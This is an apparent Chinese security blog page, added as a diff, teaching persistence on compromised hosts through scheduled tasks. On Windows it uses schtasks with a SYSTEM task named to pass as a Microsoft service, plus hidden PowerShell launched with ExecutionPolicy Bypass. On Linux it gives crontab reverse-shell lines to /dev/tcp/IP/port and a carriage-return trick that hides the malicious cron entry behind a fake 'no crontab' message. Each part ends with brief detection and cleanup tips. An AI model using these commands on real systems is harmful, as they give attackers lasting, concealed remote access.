@@ -1,0 +1,505 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>计划任务 | 小C♥天天</title>
+        <meta name="author" content="小C&天天">
+        <meta name="description" content="^v^">
+        <meta name="keywords" content="">
+        <link rel="icon" href="/images/icon.jpg">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        <link rel="stylesheet" href="/css/main.css">
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+        <script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
+        <link rel="stylesheet" href="/css/style.css">
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:30vmin;height:30vmin;padding:60px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #dd20dd;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">正在加载</p><div><img alt="loading" src="/images/afde9fa65a5742a90b51d6e1211e841e.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">小C♥天天</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;文章</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <form class="search">
+            <input type="text" placeholder="需要搜索什么？">
+            <button type="submit"></button>
+        </form>
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;小C♥天天</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+
+<div id="home-posts-wrap" class=>
+<div class="article">
+    <div>
+        <h1>计划任务 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2023/3/14
+        </span>
+        
+        <span class="category">
+            <a href="/categories/内网">
+                <span class="icon">
+                    <svg class="fa-icon"><use xlink:href="#bookmark-solid"></use></svg>
+                </span>
+                内网
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/权限维持" style="color: #ff7d73">
+                    权限维持
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/内网渗透" style="color: #ffa2c4">
+                    内网渗透
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="壹-介绍"><a href="#壹-介绍" class="headerlink" title="壹 介绍"></a>壹 介绍</h1><p>计划任务的作用：是做一些周期性的任务，在生产中的主要用来定期备份数据。所以在对肉鸡或者服务器进行权限维持时，我们可以考虑计划任务。</p>
+<span id="more"></span>
+<h1 id="贰-Windows"><a href="#贰-Windows" class="headerlink" title="贰 Windows"></a>贰 Windows</h1><h2 id="2-1-打开计划任务窗口"><a href="#2-1-打开计划任务窗口" class="headerlink" title="2.1 打开计划任务窗口"></a>2.1 打开计划任务窗口</h2><ul>
+<li>方法一：右击此电脑-&gt;管理-&gt;任务计划程序</li>
+<li>方法二：控制面板-&gt;管理工具-&gt;任务计划程序</li>
+<li>方法三：Win+R-&gt;运行-&gt;输入<code>taskschd.msc</code></li>
+<li>方法四：powershell-&gt;<code>taskschd.msc</code></li>
+</ul>
+<h2 id="2-2-操作"><a href="#2-2-操作" class="headerlink" title="2.2 操作"></a>2.2 操作</h2><h3 id="2-2-1-图形化操作"><a href="#2-2-1-图形化操作" class="headerlink" title="2.2.1 图形化操作"></a>2.2.1 图形化操作</h3><p>创建任务于创建基本任务有什么不同？基本任务是系统要求的，一定要注意权限问题，只有对应权限才能执行对应操作和创建的计划任务。</p>
+<ul>
+<li>创建一个计划任务<br><img src="/images/%E5%86%85%E7%BD%91/b07086a9c1bfffbf5f704babff2fb32a.png" alt="b07086a9c1bfffbf5f704babff2fb32a.png"></li>
+<li>为计划任务创建触发器<br><img src="/images/%E5%86%85%E7%BD%91/414e35dc68144770fe03094299ca21a7.png" alt="414e35dc68144770fe03094299ca21a7.png"></li>
+<li>为计划任务添加操作，<font color="red">需要注意默认执行路径是<code>C:\Windows\System32</code>，所以我们可以在启始于那里加工作路径</font>。<br><img src="/images/%E5%86%85%E7%BD%91/4f2ea0845d34a4caa2a2bb26286d6312.png" alt="4f2ea0845d34a4caa2a2bb26286d6312.png"></li>
+<li>保存，并试着运行一下，OK，这里的操作只是图形化，一般情况我们更喜欢使用命令行操作。<br><img src="/images/%E5%86%85%E7%BD%91/10d1a0b70b22db22831244fe8384cc6c.png" alt="10d1a0b70b22db22831244fe8384cc6c.png"></li>
+</ul>
+<h3 id="2-2-2-命令行操作"><a href="#2-2-2-命令行操作" class="headerlink" title="2.2.2 命令行操作"></a>2.2.2 命令行操作</h3><p>命令行分两步：计划任务、powershell隐藏执行终端</p>
+<ul>
+<li>计划任务</li>
+</ul>
+<p>对于命令行操作，我们可以使用<code>schtasks</code>命令。</p>
+<pre><code class="bash"># 查看内置的基本命令
+schtasks /?
+# 基本操作
+/Create：创建新计划任务。
+/Delete：删除计划任务。
+/Query：显示所有计划任务。
+/Change：更改计划任务属性。
+/Run：按需运行计划任务。
+/End：中止当前正在运行的计划任务。
+/ShowSid：显示与计划的任务名称相应的安全标识符。
+/?：显示此帮助消息。
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/d8b7a9f369fc8604b37872d443cbec21.png" alt="d8b7a9f369fc8604b37872d443cbec21.png"></p>
+<p>然后就根据要使用的命令一步一步操作，如果有不了解的可以使用<code>/?</code>。</p>
+<p>常用创建命令：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>长参数</th>
+<th>参数详细说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;TN</td>
+<td>taskname</td>
+<td>以路径\名称形式指定对此计划任务进行唯一标识的字符串。</td>
+</tr>
+<tr>
+<td>&#x2F;TR</td>
+<td>taskrun</td>
+<td>指定在这个计划时间运行的程序的路径和文件名。例如: C:\windows\system32\calc.exe</td>
+</tr>
+<tr>
+<td>&#x2F;RU</td>
+<td>username</td>
+<td>指定任务在其下运行的“运行方式”用户帐户(用户上下文)。对于系统帐户，有效值是 “”、”NT AUTHORITY\SYSTEM” 或”SYSTEM”，不建议指定用户。</td>
+</tr>
+<tr>
+<td>&#x2F;SC</td>
+<td>schedule</td>
+<td>指定计划类型，如ONSTART（开机启动）、ONLOGON（登录启动）、ONIDLE（空闲）</td>
+</tr>
+</tbody></table>
+<ul>
+<li>例子</li>
+</ul>
+<pre><code class="bash">schtasks /create /ru system /tn &quot;Microsoft\Windows\Multimedia\SystemMediaService&quot; /sc ONSTART /tr &quot;C:\cs.exe&quot; // 创建⼀个名为Microsoft\Windows\Multimedia\SystemMediaService，开机时执⾏ c:\cs.exe 的计划任务，需要管理员权限
+
+schtasks /change /tn &quot;Microsoft\Windows\Multimedia\SystemSoundsService&quot; /ru system /tr &quot;C:\cs.exe&quot; /enable // 修改 Microsoft\Windows\Multimedia\SystemSoundsService 计划任务，需要管理员权限，更改任务⽆法通过 /sc、/mo 参数更改计划频率
+</code></pre>
+<ul>
+<li>powershell执行</li>
+</ul>
+<pre><code class="bash"># 有这两种，执行exe和执行ps1
+# 执行exe
+powershell -ExecutionPolicy Bypass -windowstyle hidden -command &#39;notepad.exe&#39;
+# 切记-command的后面的参数一定是单引号括起来
+# 执行ps1
+powershell -ExecutionPolicy Bypass -windowstyle hidden -File &#39;C:\Users\admin\Desktop\demo.ps1&#39;
+</code></pre>
+<ul>
+<li>完整<pre><code class="bash"># 很多时候都是因为权限问题导致不成功
+schtasks.exe /create /tn &quot;restart&quot; /sc ONLOGON /tr &quot;powershell -ExecutionPolicy Bypass -windowstyle hidden -File &#39;C:\Users\admin\Desktop\demo.ps1&#39;&quot;
+schtasks.exe /create /tn &quot;restart&quot; /sc ONLOGON /tr &quot;powershell -ExecutionPolicy Bypass -windowstyle hidden -command &#39;notepad.exe&#39;&quot;
+</code></pre>
+</li>
+</ul>
+<p>关于<code>C:\Users\admin\Desktop\demo.ps1</code>是我们创建的恶意文件。</p>
+<h2 id="2-3-检测以及清理"><a href="#2-3-检测以及清理" class="headerlink" title="2.3 检测以及清理"></a>2.3 检测以及清理</h2><ul>
+<li>检测<br>查看计划任务程序库中是否存在异常计划任务：<br><img src="/images/%E5%86%85%E7%BD%91/05e6e9f7570ac1318068f10a7ebfa87c.png" alt="05e6e9f7570ac1318068f10a7ebfa87c.png"></li>
+<li>清除<br>删除异常计划任务及对应⽂件。</li>
+</ul>
+<h1 id="叁-Linux"><a href="#叁-Linux" class="headerlink" title="叁 Linux"></a>叁 Linux</h1><p>linux系统中，可以通过<code>crontab</code>和<code>at</code>两种命令实现计划任务，这里只介绍周期性计划任务——<code>crontab</code>。</p>
+<h2 id="3-1-crontab——周期性计划任务"><a href="#3-1-crontab——周期性计划任务" class="headerlink" title="3.1 crontab——周期性计划任务"></a>3.1 crontab——周期性计划任务</h2><ul>
+<li>文件</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>文件&#x2F;目录</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/etc/crontab</code></td>
+<td>该文件的作用相当于&#x2F;etc&#x2F;cron.d&#x2F;下面的某一个文件，可以定义系统计划任务</td>
+</tr>
+<tr>
+<td><code>/var/spool/cron/</code></td>
+<td>以用户名命名的文本文件，存放各个用户自己设定的定时任务，普通用户没有权限直接访问，必须通过crontab命令</td>
+</tr>
+<tr>
+<td><code>/etc/cron.d/</code></td>
+<td>存放用来设定除了每天&#x2F;每周&#x2F;每月之外的定时任务，比如说周期执行的任务和其他任何定时任务</td>
+</tr>
+<tr>
+<td><code>/etc/cron.d/0hourly</code></td>
+<td>系统每小时第一分钟需要执行的任务</td>
+</tr>
+<tr>
+<td><code>/etc/cron.deny</code></td>
+<td>用户拒绝列表(在该文件中的用户不能使用cron服务)</td>
+</tr>
+<tr>
+<td><code>/etc/cron.monthly/</code></td>
+<td>存放系统每个月需要执行的脚本</td>
+</tr>
+<tr>
+<td><code>/etc/cron.weekly/</code></td>
+<td>存放系统每周需要执行的脚本</td>
+</tr>
+<tr>
+<td><code>/etc/cron.daily/</code></td>
+<td>存放系统每天需要执行的脚本</td>
+</tr>
+<tr>
+<td><code>/etc/cron.hourly/</code></td>
+<td>存放系统每小时需要执行的脚本</td>
+</tr>
+</tbody></table>
+<pre><code class="bash">cat /etc/crontab
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/f66665bfe3f7d37c27739bd150e0b26f.png" alt="f66665bfe3f7d37c27739bd150e0b26f.png"></p>
+<pre><code class="bash"># 命令：crontab
+-e: 编辑计划任务 edit
+-l: 查看计划任务 display
+-u: 指定用户 user
+-r: 删除计划任务 remove
+</code></pre>
+<p><code>crontab -l</code>命令实际上就是在读取<code>/var/spool/crontab/(centos)</code>、<code>/var/spool/cron/crontabs/</code> 目录下对应用户名的文件内容，比如CentOS系统的root用户执行<code>crontab -l</code>，实际就是在读取<code>/var/spool/crontab/root</code>这个文件的内容，如果用户从未通过crontab命令设置过计划任务，那么这个文件是不存在的，此时，执行<code>crontab -l</code>命令会返回<code>no crontab for root</code>。</p>
+<p><img src="/images/%E5%86%85%E7%BD%91/c90cb6dc84987be59614d2e4c44ba238.png" alt="c90cb6dc84987be59614d2e4c44ba238.png"></p>
+<pre><code class="bash"># 每月1、10、22日的4:45重启network服务
+45 4 1,10,22 * * /usr/bin/systemctl restart network
+
+# 每天18:00至23:00之间每隔30分钟重启network服务
+*/30 18-23 * * * /usr/bin/systemctl restart network
+
+# 反弹shell
+*/1 * * * * bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1&quot;
+
+# shell直接执行
+echo -e &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/IP/port;exec 0&lt;&amp;9;exec
+1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&quot;|crontab - # 该命令会修改
+/var/spool/cron/ 下对应⽤户的⽂件，如 root ⽤户执⾏该命令，则会修改该⽬录下 root
+⽂件，也相当于 crontab -e
+</code></pre>
+<h2 id="3-2-骚操作——利用不可打印字符来伪造计划任务数"><a href="#3-2-骚操作——利用不可打印字符来伪造计划任务数" class="headerlink" title="3.2 骚操作——利用不可打印字符来伪造计划任务数"></a>3.2 骚操作——利用不可打印字符来伪造计划任务数</h2><p>原理：shell在解析<code>\r</code>时会忽略掉<code>\r</code>前面的信息。<br><img src="/images/%E5%86%85%E7%BD%91/0b16c4bcef1cfbebb08c846dff638866.png" alt="0b16c4bcef1cfbebb08c846dff638866.png"></p>
+<pre><code class="bash"># 如果我们使用printf进行输出，不用echo，因为printf会将后面的清除在写入，而echo -e不会清除，而是在%开始进行代替
+# centos
+(printf &quot;*/1 * * * * bash -c &#39;bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1&#39;;\rno crontab for `whoami` %100c\n&quot;) | crontab -
+# Ubuntu
+(printf &quot;*/1 * * * * /bin/bash /root/rs.sh;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;) | crontab -
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/4ac2a1138b2403136881d749d3b54f6a.png" alt="4ac2a1138b2403136881d749d3b54f6a.png"></p>
+<h2 id="2-3-检测以及清理-1"><a href="#2-3-检测以及清理-1" class="headerlink" title="2.3 检测以及清理"></a>2.3 检测以及清理</h2><ul>
+<li>检测<br>查看各个计划任务⽂件的内容是否有异常，或使⽤ crontab -l 命令列出当前⽤户的⾃定<br>义计划任务</li>
+<li>清除<br>删除异常计划任务即可</li>
+</ul>
+<h1 id="肆-参考"><a href="#肆-参考" class="headerlink" title="肆 参考"></a>肆 参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kingle-study/p/9336721.html">linux输出之 printf 讲解—&gt;与 echo 的区别</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/the-tops/p/5626828.html">linux 中\r</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38656841/article/details/105937363">windows如何创建计划任务并在窗口界面隐藏运行</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/xyy1028/article/details/90744157">schtasks设置windows开机启动bat脚本</a></li>
+<li><a target="_blank" rel="noopener" href="http://t.zoukankan.com/daimaxuejia-p-12957644.html">Schtasks命令详解</a></li>
+</ul>
+
+    </div>
+    
+</div>
+
+    <div id="home-card">
+        <div id="card-div">
+    <div class="card-style" style="width: 300px">
+        <div class="avatar">
+            <img src="/images/f6e2b991f74bfd7b88c3ab1a3d513b94.jpg " alt="avatar">
+        </div>
+        <div class="name">
+            小C&天天
+        </div>
+        <div class="descriptions">
+            
+            <div class="description">
+                修学储能 先博后渊
+            </div>
+            
+        </div>
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/A7cc">
+                    <i class="fa-brands fa-github fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.qq.com/">
+                    <i class="fa-brands fa-qq fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.weibo.com/">
+                    <i class="fa-brands fa-weibo fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://google.com/">
+                    <i class="fa-brands fa-google fa-fw"></i>
+                </a>
+            </span>
+            
+        </div>
+        <div class="friend-links">
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="http://www.wgs6km.top/">
+                    kyrieee个人博客
+                </a>
+            </div>
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="https://tonyd0g.gitee.io/">
+                    tonyd0g
+                </a>
+            </div>
+            
+        </div>
+    </div>
+    <!-- 目录 -->
+    
+        <div class="card-style" style="width: 300px">
+            <div id="toc" class="toc-article">
+                <strong class="toc-title">文章目录</strong>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B9-%E4%BB%8B%E7%BB%8D"><span class="toc-text">壹 介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%B0-Windows"><span class="toc-text">贰 Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%89%93%E5%BC%80%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%AA%97%E5%8F%A3"><span class="toc-text">2.1 打开计划任务窗口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E6%93%8D%E4%BD%9C"><span class="toc-text">2.2 操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="toc-text">2.2.1 图形化操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%93%8D%E4%BD%9C"><span class="toc-text">2.2.2 命令行操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%A3%80%E6%B5%8B%E4%BB%A5%E5%8F%8A%E6%B8%85%E7%90%86"><span class="toc-text">2.3 检测以及清理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%81-Linux"><span class="toc-text">叁 Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-crontab%E2%80%94%E2%80%94%E5%91%A8%E6%9C%9F%E6%80%A7%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">3.1 crontab——周期性计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E9%AA%9A%E6%93%8D%E4%BD%9C%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E4%B8%8D%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E6%9D%A5%E4%BC%AA%E9%80%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%95%B0"><span class="toc-text">3.2 骚操作——利用不可打印字符来伪造计划任务数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%A3%80%E6%B5%8B%E4%BB%A5%E5%8F%8A%E6%B8%85%E7%90%86-1"><span class="toc-text">2.3 检测以及清理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%82%86-%E5%8F%82%E8%80%83"><span class="toc-text">肆 参考</span></a></li></ol>
+            </div>    
+        </div>
+        
+    </div>
+</div>
+    </div>
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2023 小C♥天天
+            <span class="footer-icon">
+                <i class="fa-brands fa-github fa-fw"></i>
+            </span>
+            @小C&天天
+        </div>
+        <div>
+            备案号：小C&天天の窝
+        </div>
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+        <!-- 3D模型 -->
+        <div id="L2dCanvas" style="position: relative;"></div>
+        <script src="/js/live2d.min.js"></script>
+        <script src="/css/live2d.css"></script>
+        <script>
+            var v = new Viewer({
+                basePath: "/model",
+                role: "zhala_2",
+                mobile: true,
+            });
+        </script>
+        <!-- 点击 -->
+        <script>
+            let body = document.getElementsByTagName('body')[0];
+            body.addEventListener('click', (e) => {
+                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
+                let randomNum = function (n) {
+                    return Math.floor(Math.random() * n)
+                }
+                let span = document.createElement('span');
+                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+                span.style.position = 'absolute';
+                span.style.top = `${e.pageY}px`;
+                span.style.left = `${e.pageX}px`;
+                span.style.transition = 'all 1s ease';
+                span.style.zIndex = 20000;
+                body.appendChild(span)
+                setTimeout(()=>{
+                    span.style.top = span.offsetTop - 100 + 'px';
+                    span.style.opacity = 0;
+                    setTimeout(()=>{span.remove()},700)
+                },0)
+            })
+        </script>
+        <!-- 流星背景特效 -->
+        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
+        <script src="/js/background.js"></script>
+    </body>
+</html>
